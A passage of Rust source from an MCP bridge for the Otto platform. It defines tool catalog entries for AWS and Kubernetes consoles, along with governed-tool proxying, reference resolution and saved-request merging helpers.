                "description": "Read-only: list EC2 instances in an account/region — instance_id, name (Name tag), state, type, az, private_ip, public_ip, launch_time, platform, vpc_id, subnet_id, tags. Optional `state` filter (pending|running|stopping|stopped|shutting-down|terminated) and `q` free-text filter on name/id/ip. Start/stop/reboot are NOT exposed to agents — use the AWS module.",
                "inputSchema": { "type": "object", "properties": { "account_id": { "type": "string" }, "region": { "type": "string" }, "state": { "type": "string" }, "q": { "type": "string" } }, "required": ["account_id"] }
            },
            {
                "name": "aws_athena_list_tables",
                "description": "Read-only: list the tables of an Athena/Glue `database` with their columns (name, type) — the schema you need before writing SQL for aws_athena_query. Optional `catalog` (default AwsDataCatalog).",
                "inputSchema": { "type": "object", "properties": { "account_id": { "type": "string" }, "database": { "type": "string" }, "catalog": { "type": "string" }, "region": { "type": "string" } }, "required": ["account_id", "database"] }
            },
            {
                "name": "aws_athena_query",
                "description": "MUTATING (aws_athena Edit — Athena bills per byte scanned): START an Athena SQL query and return `{query_execution_id}` immediately. It does NOT wait: poll aws_athena_get_query with that id until `state` is SUCCEEDED (rows in `result`), FAILED (`reason`) or CANCELLED. Pass `database` and/or `workgroup`; if the workgroup has no output location the daemon answers 400 with a hint. Prefer `LIMIT`ed queries — every byte scanned costs money.",
                "inputSchema": { "type": "object", "properties": { "account_id": { "type": "string" }, "sql": { "type": "string" }, "database": { "type": "string" }, "workgroup": { "type": "string" }, "output_location": { "type": "string", "description": "s3://bucket/prefix/ — only when the workgroup has none." }, "region": { "type": "string" } }, "required": ["account_id", "sql"] }
            },
            {
                "name": "aws_athena_get_query",
                "description": "Read-only: status + results of an Athena query execution — `state` (QUEUED|RUNNING|SUCCEEDED|FAILED|CANCELLED), `reason`, `stats` {data_scanned_bytes, execution_ms} and, once SUCCEEDED, `result` {columns, rows, truncated} (header row already dropped). Page more rows with `token` = the previous `next_token`; `max` caps rows per page. Poll every few seconds while QUEUED/RUNNING.",
                "inputSchema": { "type": "object", "properties": { "account_id": { "type": "string" }, "query_execution_id": { "type": "string" }, "token": { "type": "string" }, "max": { "type": "integer" }, "region": { "type": "string" } }, "required": ["account_id", "query_execution_id"] }
            },
            {
                "name": "aws_eks_list_clusters",
                "description": "Read-only: list the EKS clusters of an account/region — name, status, version, endpoint, arn, created_at (list + describe, max 20). To inspect workloads inside one, the user must import it into the Kubernetes module first (`k8s_list_clusters` shows imported clusters with `source: eks`).",
                "inputSchema": { "type": "object", "properties": { "account_id": { "type": "string" }, "region": { "type": "string" } }, "required": ["account_id"] }
            },
            // ---- Kubernetes console (§6). Everything runs `kubectl` with the
            // cluster's own kubeconfig/context server-side; the caller needs the
            // `kubernetes` feature (View for reads, Edit for `k8s_action`).
            {
                "name": "k8s_list_clusters",
                "description": "Read-only: list the Kubernetes clusters registered in Otto — id, name, source (kubeconfig|imported|eks), default_namespace, environment (and, for users who may configure it, context_name + cached `capabilities`). Every other k8s_* tool takes a cluster's id OR name as `cluster_id`.",
                "inputSchema": { "type": "object", "properties": {} }
            },
            {
                "name": "k8s_get_resources",
                "description": "Read-only: list resources of one `kind` (pods | deployments | statefulsets | daemonsets | replicasets | jobs | cronjobs | services | ingresses | configmaps | secrets | pvcs | hpas | rollouts | applications | events) as normalized rows — name, namespace, status, ready, restarts, age_seconds, node, ip, cpu/mem (when metrics-server exists), images, labels, `health` (ok|warn|bad|progressing) and kind-specific `extra` (e.g. deployments: desired/updated/available; rollouts: strategy/step/weight/phase; applications: sync/health/revision). Omit `namespace` for ALL namespaces. Optional `label` selector (`app=web,tier!=cache`) and `q` free-text filter on names. Secret values are never returned.",
                "inputSchema": { "type": "object", "properties": { "cluster_id": { "type": "string" }, "kind": { "type": "string" }, "namespace": { "type": "string" }, "label": { "type": "string" }, "q": { "type": "string" } }, "required": ["cluster_id", "kind"] }
            },
            {
                "name": "k8s_describe",
                "description": "Read-only: full detail of ONE resource — `manifest` (JSON, managedFields stripped, Secret data redacted), `describe` (kubectl describe text) and its recent `events` (type, reason, message, count, last_seen). `kind` is the plural from k8s_get_resources; `namespace` + `name` identify the object (omit `namespace` for cluster-scoped kinds: nodes, namespaces).",
                "inputSchema": { "type": "object", "properties": { "cluster_id": { "type": "string" }, "kind": { "type": "string" }, "namespace": { "type": "string" }, "name": { "type": "string" } }, "required": ["cluster_id", "kind", "name"] }
            },
            {
                "name": "k8s_logs",
                "description": "Read-only: the log tail of a pod as `{text, truncated}` (no follow/stream). `container` selects one container of a multi-container pod (required by kubectl when there is more than one); `tail` = number of lines (default 500); `since` = duration like `10m`/`1h`; `previous:true` reads the crashed previous container instance (use it for CrashLoopBackOff); `timestamps:true` prefixes RFC3339 timestamps. The text is capped at 256 KiB keeping the NEWEST lines.",
                "inputSchema": { "type": "object", "properties": { "cluster_id": { "type": "string" }, "namespace": { "type": "string" }, "pod": { "type": "string" }, "container": { "type": "string" }, "tail": { "type": "integer" }, "since": { "type": "string" }, "previous": { "type": "boolean" }, "timestamps": { "type": "boolean" } }, "required": ["cluster_id", "namespace", "pod"] }
            },
            {
                "name": "k8s_top",
                "description": "Read-only: live CPU (millicores) and memory (bytes) usage per pod (with per-container breakdown) from metrics-server, optionally limited to `namespace`. `available:false` means the cluster has no metrics-server — nothing else to fetch.",
                "inputSchema": { "type": "object", "properties": { "cluster_id": { "type": "string" }, "namespace": { "type": "string" } }, "required": ["cluster_id"] }
            },
            {
                "name": "k8s_health",
                "description": "Read-only: compact health digest for a MONITORED cluster (Kubernetes → Monitor enabled): classified restarts (oom / crash / probe) with pod + memory-limit detail, planned churn, memory outliers vs limits, error-rate / p95 spikes vs the 24h baseline, version drift and the collector + metrics-server status. `window` = 1h|6h|24h|7d (default 1h). Every list is capped at 20; prefer it over k8s_get_resources for periodic health checks.",
                "inputSchema": { "type": "object", "properties": { "cluster_id": { "type": "string" }, "window": { "type": "string" } }, "required": ["cluster_id"] }
            },
            {
                "name": "k8s_action",
                "description": "MUTATING (kubernetes Edit): run ONE operational action on a resource via kubectl and return `{ok, message, output}`. `action` ∈ restart (deployments/statefulsets/daemonsets/rollouts) · scale (params.replicas) · delete_pod (pods; params.grace) · rollout_status · rollout_undo (params.to_revision) · rollout_pause / rollout_resume · rollout_promote (rollouts; params.full) · rollout_abort · rollout_retry · argocd_sync (applications; params.revision, params.prune) · argocd_refresh (params.hard) · argocd_terminate_op · argocd_app_restart (params.resource_kind) · cronjob_trigger · cronjob_suspend / cronjob_resume. DESTRUCTIVE actions (delete_pod, scale to 0, rollout_undo, argocd_sync with prune) are refused unless `params.confirm_name` equals `name` — set it only after the user explicitly confirmed. Cluster RBAC denials surface as 403.",
                "inputSchema": { "type": "object", "properties": { "cluster_id": { "type": "string" }, "action": { "type": "string" }, "kind": { "type": "string" }, "namespace": { "type": "string" }, "name": { "type": "string" }, "params": { "type": "object" } }, "required": ["cluster_id", "action", "kind", "namespace", "name"] }
            }
        ]
    })
}

const VAULT_MUTATION_TOOLS: [&str; 4] = [
    "otto_vault_write",
    "otto_vault_write_file",
    "otto_vault_rename",
    "otto_vault_delete",
];

const API_MUTATION_TOOLS: [&str; 3] = [
    "otto_api_execute",
    "otto_api_upsert_request",
    "otto_api_run_automation",
];

const VAULT_REVIEW_READ_TOOLS: [(&str, &str); 8] = [
    ("otto_vault_list", "otto.vault_list"),
    ("otto_vault_dir", "otto.vault_dir"),
    ("otto_vault_read", "otto.vault_read"),
    ("otto_vault_search", "otto.vault_search"),
    ("otto_vault_backlinks", "otto.vault_backlinks"),
    ("otto_vault_tags", "otto.vault_tags"),
    ("otto_vault_graph", "otto.vault_graph"),
    ("otto_vault_okf_validate", "otto.vault_okf_validate"),
];

fn is_vault_docs_reviewer(source: Option<&str>) -> bool {
    source == Some("vault-docs-review")
}

fn tool_catalog_for_source(source: Option<&str>) -> Value {
    let mut catalog = tool_catalog();
    if source != Some(ASSISTANT_SOURCE) {
        if let Some(tools) = catalog["tools"].as_array_mut() {
            tools.retain(|tool| {
                tool["name"]
                    .as_str()
                    .is_some_and(|name| assistant_segment(name).is_none())
            });
        }
    }
    if is_vault_docs_reviewer(source) {
        if let Some(tools) = catalog["tools"].as_array_mut() {
            tools.retain(|tool| {
                tool["name"].as_str().is_some_and(|name| {
                    VAULT_REVIEW_READ_TOOLS
                        .iter()
                        .any(|(internal, _)| *internal == name)
                })
            });
        }
    }
    catalog
}

// ---------------------------------------------------------------------------
// Control-plane (governed `otto.*`) tools on this stdio surface.
//
// The operator's MCP → Otto server checklist (`GET /mcp/otto-server`, backed
// by `otto_tool_specs()`) is the ONE catalog the control plane manages. Before
// this bridge existed, a session saw only the hand-written catalog above, so a
// tool enabled in the control plane (`otto.create_pr`, `otto.open_pr_draft`,
// `otto.run_workflow`…) was simply absent from the agent's `tools/list` — the
// two catalogs drifted with nothing to grep for. Now every ENABLED governed
// tool that this surface does not already serve natively is advertised under
// the stdio naming (`otto.create_pr` → `otto_create_pr`) and its calls are
// proxied through `POST /mcp/otto-tools/invoke`, the same allow-list →
// approval → audit choke point the outward server and the HTTP transport use.
// Native tools keep winning by name: they are session-aware (workspace
// injection, reviewer scoping) and the governed twin would only add noise.
// ---------------------------------------------------------------------------

/// Governed tools (short name, no `otto.` prefix) whose capability this surface
/// already serves natively under a DIFFERENT name. They are not re-advertised —
/// the agent should see one tool per capability — and a call by their stdio
/// name is still routed to the governed path, which is harmless (same RBAC).
const GOVERNED_ALIASED_BY_NATIVE: &[(&str, &str)] = &[
    ("get_usage_summary", "otto_usage_summary"),
    ("get_product_story", "otto_product_story"),
    ("query_db_readonly", "otto_db_query"),
    // Design Hall reads are served natively under their bare names.
    ("design_list", "design_list"),
    ("design_get", "design_get"),
    ("design_links", "design_links"),
    ("design_search", "design_search"),
    // Otto Assistant memory: served natively (session-bound, chip + Undo).
    ("assistant_remember", "assistant_remember"),
    ("assistant_forget", "assistant_forget"),
    ("assistant_recall", "assistant_recall"),
    // Swarm board reads + PR review runs are native under other names.
    ("list_swarm_projects", "swarm_list_projects"),
    ("list_swarm_tasks", "swarm_list_tasks"),
    ("list_pr_reviews", "otto_git_pr_review"),
    // The cloud consoles are native under their bare names; without these the
    // session saw every AWS/K8s tool twice (`k8s_top` AND `otto_k8s_top`).
    ("aws_list_accounts", "aws_list_accounts"),
    ("aws_s3_list_buckets", "aws_s3_list_buckets"),
    ("aws_s3_list_objects", "aws_s3_list_objects"),
    ("aws_s3_preview", "aws_s3_preview"),
    ("aws_sqs_list_queues", "aws_sqs_list_queues"),
    ("aws_sqs_peek", "aws_sqs_peek"),
    ("aws_sqs_send", "aws_sqs_send"),
    ("aws_ec2_list_instances", "aws_ec2_list_instances"),
    ("aws_athena_list_tables", "aws_athena_list_tables"),
    ("aws_athena_query", "aws_athena_query"),
    ("aws_athena_get_query", "aws_athena_get_query"),
    ("aws_eks_list_clusters", "aws_eks_list_clusters"),
    ("k8s_list_clusters", "k8s_list_clusters"),
    ("k8s_get_resources", "k8s_get_resources"),
    ("k8s_describe", "k8s_describe"),
    ("k8s_logs", "k8s_logs"),
    ("k8s_top", "k8s_top"),
    ("k8s_health", "k8s_health"),
    ("k8s_action", "k8s_action"),
];

/// How long a governed call waits for a human decision before returning
/// `pending_approval`. Below [`CALL_TIMEOUT`] so the daemon answers before this
/// bridge gives up; a later identical call reuses the approval once granted.
const GOVERNED_WAIT_SECS: u64 = 15;

/// The stdio-facing name of a governed catalog entry: `otto.create_pr` →
/// `otto_create_pr`. Claude/Codex mangle a dotted tool name, and the native
/// tools already use this underscore form.
fn governed_stdio_name(spec_name: &str) -> String {
    format!(
        "otto_{}",
        spec_name.strip_prefix("otto.").unwrap_or(spec_name)
    )
}

/// Names of the tools served natively by this binary (the static catalog).
fn native_tool_names() -> Vec<String> {
    tool_catalog()["tools"]
        .as_array()
        .map(|tools| {
            tools
                .iter()
                .filter_map(|t| t["name"].as_str().map(str::to_string))
                .collect()
        })
        .unwrap_or_default()
}

/// The governed spec a stdio tool name proxies to, or `None` when the name is
/// served natively (by the same or an aliased name) or is not a governed tool.
fn governed_spec_for_stdio_name(name: &str) -> Option<Value> {
    let short = name.strip_prefix("otto_")?;
    let native = native_tool_names();
    if native.iter().any(|n| n == name)
        || GOVERNED_ALIASED_BY_NATIVE
            .iter()
            .any(|(g, n)| *g == short && native.iter().any(|x| x == n))
    {
        return None;
    }
    otto_server::mcp_outward::otto_tool_specs()
        .into_iter()
        .find(|s| s["name"].as_str() == Some(&format!("otto.{short}")))
}

/// The governed (`otto.*`) name a stdio tool name proxies to, if any.
fn governed_tool_for_stdio_name(name: &str) -> Option<String> {
    governed_spec_for_stdio_name(name).and_then(|s| s["name"].as_str().map(str::to_string))
}

/// The `tools/list` entries for the control-plane-enabled governed tools that
/// have no native equivalent here. `enabled` holds full `otto.*` names.
fn governed_tools_for(enabled: &[String]) -> Vec<Value> {
    otto_server::mcp_outward::otto_tool_specs()
        .into_iter()
        .filter(|s| {
            s["name"]
                .as_str()
                .is_some_and(|n| enabled.iter().any(|e| e == n))
        })
        .filter_map(|s| {
            let full = s["name"].as_str()?;
            let stdio = governed_stdio_name(full);
            governed_spec_for_stdio_name(&stdio)?;
            Some(json!({
                "name": stdio,
                "description": s["description"],
                "inputSchema": s["inputSchema"],
            }))
        })
        .collect()
}

/// Arguments for a governed call: the agent's arguments plus this session's
/// `workspace_id` when the tool's schema REQUIRES one and the agent omitted it —
/// the same courtesy the native tools extend, so an agent needn't know its own
/// workspace id to open a PR.
fn governed_invoke_args(ctx: &Ctx, spec: &Value, args: &Value) -> Value {
    let mut out = args.as_object().cloned().unwrap_or_default();
    // Only a REQUIRED workspace is defaulted to this session's: an optional one
    // means "omit to span every workspace you can read" (the cross-workspace
    // list tools) or is filled server-side (vaults, design), so injecting it
    // would silently narrow the answer to this workspace.
    let needs_ws = spec["inputSchema"]["required"]
        .as_array()
        .is_some_and(|r| r.iter().any(|k| k == "workspace_id"));
    if needs_ws && !out.contains_key("workspace_id") {
        if let Some(ws) = &ctx.workspace_id {
            out.insert("workspace_id".into(), Value::String(ws.clone()));
        }
    }
    Value::Object(out)
}

/// Map the compatibility names exposed by the in-session MCP bridge onto the
/// governed outward tools. Workspace identity is injected from the session;
/// it is also pinned in the persisted token scope and checked server-side.
fn reviewer_read_invoke(name: &str, args: &Value, workspace_id: &str) -> Option<(String, Value)> {
    let outward = VAULT_REVIEW_READ_TOOLS
        .iter()
        .find_map(|(internal, outward)| (*internal == name).then_some(*outward))?;
    let mut mapped = args.as_object().cloned().unwrap_or_default();
    mapped.insert(
        "workspace_id".to_string(),
        Value::String(workspace_id.to_string()),
    );
    Some((outward.to_string(), Value::Object(mapped)))
}

async fn run_reviewer_read(ctx: &Ctx, name: &str, args: &Value) -> Result<Value, String> {
    let workspace = ctx
        .workspace_id
        .as_deref()
        .ok_or("no workspace context (OTTO_WORKSPACE_ID unset)")?;
    let (tool, arguments) = reviewer_read_invoke(name, args, workspace)
        .ok_or_else(|| format!("tool `{name}` is outside the documentation reviewer scope"))?;
    let envelope = ctx
        .post_json(
            "/mcp/otto-tools/invoke",
            &json!({"tool": tool, "arguments": arguments}),
        )
        .await?;
    if envelope.get("decision").and_then(Value::as_str) != Some("allowed")
        || envelope.get("executed").and_then(Value::as_bool) != Some(true)
    {
        return Err(envelope
            .get("reason")
            .and_then(Value::as_str)
            .unwrap_or("governed reviewer read was denied")
            .to_string());
    }
    Ok(envelope.get("content").cloned().unwrap_or(Value::Null))
}

/// The new first-party feature read tools route through one pure mapping
/// ([`read_route`]); this is the set the dispatcher recognises before the
/// catch-all "unknown tool". All are reads (GET, or a read-only viewer POST).
const FEATURE_READ_TOOLS: &[&str] = &[
    "otto_list_workflow_runs",
    "otto_get_workflow_run",
    "otto_list_broker_topics",
    "otto_search_issues",
    "otto_list_issue_transitions",
    "swarm_list_projects",
    "swarm_list_tasks",
    "swarm_utilization",
    "otto_search_memory",
    "otto_list_repos",
    "otto_list_prs",
    "otto_get_pr",
    "otto_list_sessions",
    "otto_get_session",
    "otto_wait_session",
    "otto_list_findings",
    "otto_usage_summary",
    "otto_list_improvement_runs",
    "otto_list_improvement_edits",
    "otto_vault_list",
    "otto_vault_dir",
    "otto_vault_read",
    "otto_vault_search",
    "otto_vault_backlinks",
    "otto_vault_tags",
    "otto_vault_graph",
    "otto_vault_okf_validate",
    // Design Hall reads (the global design library; find + cite earlier work).
    "design_list",
    "design_get",
    "design_links",
    "design_search",
    // AWS console reads (`aws_sqs_peek` is the one read-only POST: a
    // receive-message with visibility timeout 0, graded View by the policy table).
    "aws_list_accounts",
    "aws_s3_list_buckets",
    "aws_s3_list_objects",
    "aws_s3_preview",
    "aws_sqs_list_queues",
    "aws_sqs_peek",
    "aws_ec2_list_instances",
    "aws_athena_list_tables",
    "aws_athena_get_query",
    "aws_eks_list_clusters",
    // Kubernetes console reads (`k8s_logs` is text/plain and has its own arm).
    "k8s_list_clusters",
    "k8s_get_resources",
    "k8s_describe",
    "k8s_top",
    "k8s_health",
];

/// Native list tools served by the daemon's cross-workspace directory
/// (`GET /refs/directory`, `otto_server::agent_refs`): every workspace the
/// session owner can read, each row annotated with its workspace, this
/// session's workspace first. `otto_list_connections` also uses it (then
/// keeps only the queryable DB kinds).
const NATIVE_DIRECTORY_TOOLS: &[(&str, &str)] = &[
    ("otto_list_workspaces", "workspace"),
    ("otto_list_workflows", "workflow"),
    ("otto_list_goal_loops", "goal_loop"),
    ("otto_list_broker_clusters", "broker_cluster"),
    ("otto_list_swarms", "swarm"),
    ("otto_list_product_stories", "product_story"),
    ("otto_list_agent_rooms", "agent_room"),
    ("otto_list_issue_accounts", "issue_account"),
];

/// Native `(tool, argument, kind)` whose argument is a friendly reference —
/// the id, or a name / title / Jira key / label — resolved by the daemon
/// (`GET /refs/resolve`, as the session owner) before the call. An omitted
/// issue account resolves to the owner's only account.
const NATIVE_REF_ARGS: &[(&str, &str, &str)] = &[
    ("otto_db_schema", "connection_id", "connection"),
    ("otto_db_children", "connection_id", "connection"),
    ("otto_db_object", "connection_id", "connection"),
    ("otto_db_query", "connection_id", "connection"),
    ("otto_list_broker_topics", "cluster_id", "broker_cluster"),
    ("otto_search_issues", "account_id", "issue_account"),
    ("otto_list_issue_transitions", "account_id", "issue_account"),
    ("otto_list_workflow_runs", "workflow_id", "workflow"),
    ("swarm_list_projects", "swarm_id", "swarm"),
    ("swarm_utilization", "swarm_id", "swarm"),
    ("otto_product_story", "story_id", "product_story"),
    ("otto_vault_dir", "vault_id", "vault"),
    ("otto_vault_read", "vault_id", "vault"),
    ("otto_vault_search", "vault_id", "vault"),
    ("otto_vault_backlinks", "vault_id", "vault"),
    ("otto_vault_tags", "vault_id", "vault"),
    ("otto_vault_graph", "vault_id", "vault"),
    ("otto_vault_okf_validate", "vault_id", "vault"),
    ("otto_vault_write", "vault_id", "vault"),
    ("otto_vault_write_file", "vault_id", "vault"),
    ("otto_vault_rename", "vault_id", "vault"),
    ("otto_vault_delete", "vault_id", "vault"),
    ("design_get", "artifact_id", "design_artifact"),
    ("design_links", "artifact_id", "design_artifact"),
    ("canvas_get_scene", "scene_id", "canvas_scene"),
    ("canvas_update_scene", "scene_id", "canvas_scene"),
    ("otto_room_post", "room_id", "agent_room"),
    ("otto_room_read", "room_id", "agent_room"),
    ("aws_s3_list_buckets", "account_id", "aws_account"),
    ("aws_s3_list_objects", "account_id", "aws_account"),
    ("aws_s3_preview", "account_id", "aws_account"),
    ("aws_sqs_list_queues", "account_id", "aws_account"),
    ("aws_sqs_peek", "account_id", "aws_account"),
    ("aws_sqs_send", "account_id", "aws_account"),
    ("aws_ec2_list_instances", "account_id", "aws_account"),
    ("aws_athena_list_tables", "account_id", "aws_account"),
    ("aws_athena_query", "account_id", "aws_account"),
    ("aws_athena_get_query", "account_id", "aws_account"),
    ("aws_eks_list_clusters", "account_id", "aws_account"),
    ("k8s_get_resources", "cluster_id", "k8s_cluster"),
    ("k8s_describe", "cluster_id", "k8s_cluster"),
    ("k8s_logs", "cluster_id", "k8s_cluster"),
    ("k8s_top", "cluster_id", "k8s_cluster"),
    ("k8s_health", "cluster_id", "k8s_cluster"),
    ("k8s_action", "cluster_id", "k8s_cluster"),
];

/// The `/refs/directory` query for a native list tool. Pure — unit-tested.
fn directory_path(kind: &str, args: &Value, session_ws: Option<&str>) -> String {
    let mut path = format!("/refs/directory?kind={}", seg(kind));
    path.push_str(&opt_query(args, &[("workspace_id", "workspace_id")]));
    if let Some(ws) = session_ws.filter(|s| !s.is_empty()) {
        path.push_str(&format!("&prefer_workspace_id={}", seg(ws)));
    }
    path
}

/// The references a native call needs resolved: `(arg, kind, reference)` —
/// a present value that is not an id, a workspace NAME, or an omitted issue
/// account (the owner's sole account). Pure — unit-tested.
fn native_ref_plan(name: &str, args: &Value) -> Vec<(&'static str, &'static str, Option<String>)> {
    let text = |k: &str| -> Option<String> {
        match args.get(k)? {
            Value::String(v) if !v.trim().is_empty() => Some(v.trim().to_string()),
            Value::Number(n) => Some(n.to_string()),
            _ => None,
        }
    };
    let mut plan = Vec::new();
    if let Some(ws) = text("workspace_id").filter(|w| !otto_server::agent_refs::looks_like_id(w)) {
        plan.push(("workspace_id", "workspace", Some(ws)));
    }
    for (tool, arg, kind) in NATIVE_REF_ARGS {
        if *tool != name {
            continue;
        }
        match text(arg) {
            Some(v) if !otto_server::agent_refs::looks_like_id(&v) => {
                plan.push((*arg, *kind, Some(v)))
            }
            None if *kind == "issue_account" => plan.push((*arg, *kind, None)),
            _ => {}
        }
    }
    plan
}

/// Resolve every friendly reference a native call carries (see
/// [`native_ref_plan`]) through `GET /refs/resolve`, returning the arguments
/// with canonical ids. An unknown / ambiguous reference errors with the
/// daemon's candidate listing.
async fn resolve_native_refs(ctx: &Ctx, name: &str, args: &Value) -> Result<Option<Value>, String> {
    let plan = native_ref_plan(name, args);
    if plan.is_empty() {
        return Ok(None);
    }
    let mut out = args.clone();
    if !out.is_object() {
        out = json!({});
    }
    for (arg, kind, reference) in plan {
        let mut path = format!("/refs/resolve?kind={}&arg={}", seg(kind), seg(arg));
        if let Some(r) = &reference {
            path.push_str(&format!("&ref={}", seg(r)));
        }
        if let Some(ws) = ctx.workspace_id.as_deref().filter(|s| !s.is_empty()) {
            path.push_str(&format!("&prefer_workspace_id={}", seg(ws)));
        }
        let v = match ctx.get_json(&path).await {
            Ok(v) => v,
            // The daemon could not be reached at all: pass the reference
            // through untouched so the call's own argument checks — and then
            // its own request — report the real problem. A daemon ANSWER
            // (unknown / ambiguous reference) always surfaces.
            Err(e) if e.starts_with("request failed") || e.starts_with("upstream timeout") => {
                return Ok(None);
            }
            Err(e) => return Err(e),
        };
        let id = v["id"]
            .as_str()
            .ok_or_else(|| format!("{arg}: resolution returned no id"))?;
        out[arg] = if kind == "vault" {
            id.parse::<i64>()
                .map(|n| json!(n))
                .unwrap_or_else(|_| json!(id))
        } else {
            json!(id)
        };
    }
    Ok(Some(out))
}

/// Native tools whose `repo_id` is a friendly reference: resolved by the
/// daemon (`GET /git/repos/resolve`) before the call — id, name, local path or
/// remote, across EVERY workspace the session owner can read, falling back to
/// the session's own cwd when omitted. The governed `otto.*` git tools get the
/// same resolution server-side in the invoke choke point.
const NATIVE_REPO_REF_TOOLS: &[&str] = &[
    "otto_git_pr_review",
    "otto_list_prs",
    "otto_get_pr",
    "otto_comment_pr",
];

/// Schema text for a friendly `repo_id` (kept in step with the governed
/// catalog's wording in `otto_server::mcp_outward`).
/// Schema text for the cross-workspace list tools' optional `workspace_id`.
const WS_DIR_DESC: &str = "Optional: only this workspace (id or name). Omit to list every workspace you can read (this session's first).";
/// Schema text for an issue-account argument (resolved by `/refs/resolve`).
const ISSUE_ACCOUNT_DESC: &str = "Your Jira/Confluence account id, label, email or base URL (otto_list_issue_accounts). Omit when you have exactly one account.";

const REPO_REF_DESC: &str = "Otto repo id — or a repo name, local path, or remote (`owner/repo` or URL). Resolved across EVERY workspace you can read, not just this one. Omit it to use the repo this session is working in. An ambiguous or unknown reference returns the candidates to pick from.";

/// The `/git/repos/resolve` query for a tool call's `repo_id` (+ optional
/// `workspace_id` filter). Pure, so the binding is unit-tested.
fn resolve_repo_path(args: &Value) -> String {
    let q = opt_query(
        args,
        &[("ref", "repo_id"), ("workspace_id", "workspace_id")],
    );
    let q = q.trim_start_matches('&');
    if q.is_empty() {
        "/git/repos/resolve".to_string()
    } else {
        format!("/git/repos/resolve?{q}")
    }
}

/// Resolve `args.repo_id` (a friendly reference, or absent) to the canonical
/// Otto repo id via the daemon, returning the arguments with `repo_id`
/// rewritten. The daemon authorizes as the session owner (Git:View +
/// workspace Viewer), so a reference only ever lands on a repo the owner could
/// already list; an unknown/ambiguous reference errors with the candidates.
async fn resolve_repo_arg(ctx: &Ctx, args: &Value) -> Result<Value, String> {
    let v = ctx.get_json(&resolve_repo_path(args)).await?;
    let id = v["repo"]["id"]
        .as_str()
        .ok_or("repo resolution returned no repo")?
        .to_string();
    let mut out = args.clone();
    out["repo_id"] = json!(id);
    Ok(out)
}

/// Append `&key=<value>` for every `(key, arg)` whose argument is a non-empty
/// string or a number, percent-encoding string values. Optional query filters
/// for the AWS/K8s reads (`?region=`, `?prefix=`, `?ns=` …) all follow this
/// shape; booleans are rendered `true`/`false`.
fn opt_query(args: &Value, pairs: &[(&str, &str)]) -> String {
    let mut q = String::new();
    for (key, arg) in pairs {
        match args.get(arg) {
            Some(Value::String(s)) if !s.is_empty() => q.push_str(&format!("&{key}={}", seg(s))),
            Some(Value::Number(n)) => q.push_str(&format!("&{key}={n}")),
            Some(Value::Bool(b)) => q.push_str(&format!("&{key}={b}")),
            _ => {}
        }
    }
    q
}

/// A resolved upstream read call: GET (or a read-only viewer POST), the `/api/v1`-
/// relative path, and an optional JSON body. Built purely from `(name, args, ws)`
/// by [`read_route`] so each feature read's endpoint binding is unit-tested.
#[derive(Debug, Clone, PartialEq)]
struct ReadCall {
    post: bool,
    path: String,
    body: Option<Value>,
}

impl ReadCall {
    fn get(path: String) -> Self {
        Self {
            post: false,
            path,
            body: None,
        }
    }
    fn post(path: String, body: Value) -> Self {
        Self {
            post: true,
            path,
            body: Some(body),
        }
    }
}

/// Workspace-scoped base path for the saved-request API client.
fn api_base(ctx: &Ctx) -> Result<String, String> {
    let ws = ctx
        .workspace_id
        .as_deref()
        .filter(|s| !s.is_empty())
        .ok_or("no workspace context (OTTO_WORKSPACE_ID unset)")?;
    Ok(format!("/workspaces/{}/api-client", seg(ws)))
}

/// Select one case-insensitive exact name match, reporting candidate ids when
/// duplicate names make the request ambiguous.
fn pick_by_name<'a>(items: &'a [Value], name: &str, what: &str) -> Result<&'a Value, String> {
    let matches: Vec<&Value> = items
        .iter()
        .filter(|item| {
            item.get("name")
                .and_then(Value::as_str)
                .is_some_and(|candidate| candidate.eq_ignore_ascii_case(name))
        })
        .collect();
    match matches.as_slice() {
        [] => Err(format!("no {what} named '{name}'")),
        [item] => Ok(item),
        many => {
            let ids = many
                .iter()
                .map(|item| {
                    item.get("id")
                        .and_then(Value::as_str)
                        .unwrap_or("<missing id>")
                })
                .collect::<Vec<_>>()
                .join(", ");
            Err(format!("ambiguous {what} '{name}': {ids}"))
        }
    }
}

/// Reject nested template expansion in per-run overrides before any upstream
/// request is made. The daemon repeats this check at the trust boundary.
fn check_override_vars(vars: &Value) -> Result<(), String> {
    let vars = vars
        .as_object()
        .ok_or_else(|| "argument `vars` must be an object".to_string())?;
    for (key, value) in vars {
        if value.as_str().is_some_and(|value| value.contains("{{")) {
            return Err(format!("vars override '{key}' must not contain '{{{{'"));
        }
    }
    Ok(())
}

/// Merge a parsed curl shape under explicit tool arguments. Auth and extras are
/// absent unless supplied so PATCH preserves the daemon's stored values.
///
/// On UPDATE (`stored` = the saved request, read raw as the session owner and
/// never returned to the agent) every field the agent did not send keeps its
/// stored value: the PATCH route replaces the row wholesale (only auth/extras
/// are preserved server-side), so defaulting an omitted `method` to GET or an
/// omitted `headers` to `[]` silently rewrote the request. `docs_md` merges
/// into the stored `extras` instead of replacing its scripts/settings.
fn merge_upsert(args: &Value, parsed_curl: Option<&Value>, stored: Option<&Value>) -> Value {
    const STORED_FIELDS: [&str; 9] = [
        "name",
        "method",
        "url",
        "headers",
        "query",
        "body_mode",
        "body",
        "collection_id",
        "ssh_connection_id",
    ];
    const CURL_FIELDS: [&str; 7] = [
        "method",
        "url",
        "headers",
        "query",
        "body_mode",
        "body",
        "auth",
    ];
    const EXPLICIT_FIELDS: [&str; 9] = [
        "name",
        "method",
        "url",
        "headers",
        "query",
        "body_mode",
        "body",
        "auth",
        "collection_id",
    ];

    let mut merged = serde_json::Map::new();
    if let Some(stored) = stored {
        for field in STORED_FIELDS {
            if let Some(value) = stored.get(field).filter(|v| !v.is_null()) {
                merged.insert(field.to_string(), value.clone());
            }
        }
    }
    if let Some(parsed) = parsed_curl {
        for field in CURL_FIELDS {
            if let Some(value) = parsed.get(field) {
                merged.insert(field.to_string(), value.clone());
            }
        }
    }
    for field in EXPLICIT_FIELDS {
        if let Some(value) = args.get(field) {
            merged.insert(field.to_string(), value.clone());
        }
    }
    merged
        .entry("method".to_string())
        .or_insert_with(|| json!("GET"));
    merged
        .entry("body_mode".to_string())
        .or_insert_with(|| json!("none"));
    if let Some(docs_md) = args.get("docs_md") {
        let mut extras = stored
            .and_then(|s| s.get("extras"))
            .and_then(Value::as_object)
            .cloned()
            .unwrap_or_default();
        extras.entry("v".to_string()).or_insert_with(|| json!(1));
        extras.insert("docs_md".to_string(), docs_md.clone());
        merged.insert("extras".to_string(), Value::Object(extras));
    }
    Value::Object(merged)
}

/// Map a feature read tool + its arguments to the upstream daemon read. Pure: no
/// I/O. Workspace-scoped tools use the session's workspace (`ws`); others take an
/// explicit id argument. Every path is a GET or the read-only `/memory/search`
